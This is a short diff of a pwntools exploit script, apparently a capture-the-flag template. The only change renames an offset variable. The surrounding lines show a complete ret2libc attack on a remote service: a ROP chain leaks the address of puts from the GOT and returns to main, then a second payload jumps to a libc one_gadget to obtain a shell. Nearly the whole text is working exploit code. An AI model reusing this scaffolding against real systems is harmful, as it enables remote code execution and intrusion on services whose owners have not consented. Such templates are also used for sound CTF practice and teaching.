@@ -5,7 +5,7 @@ context.log_level='debug'
 BINARY = "./binary"
 URL = "someplace.com"
 PORT = 1337
-OFFSET = 0
+BUF_OFFSET = 0
 PROMPT = "Input: "
 
 ### script ###
@@ -14,7 +14,7 @@ rop = ROP(BINARY)
 p = remote(URL, PORT)
 
 payload1 = flat(
-        b"A"*OFFSET,
+        b"A"*BUF_OFFSET,
         rop.rdi.address, elf.got['puts'],
         elf.plt['puts'],
         elf.symbols['main']
@@ -38,7 +38,7 @@ libc_base = puts_libc - libc.symbols['puts']
 log.info("libc base is: " + hex(libc_base))
 syscall = libc_base + one_gadget
 payload2 = flat(
-	b"A"*OFFSET,
+	b"A"*BUF_OFFSET,
 	syscall
 )
 
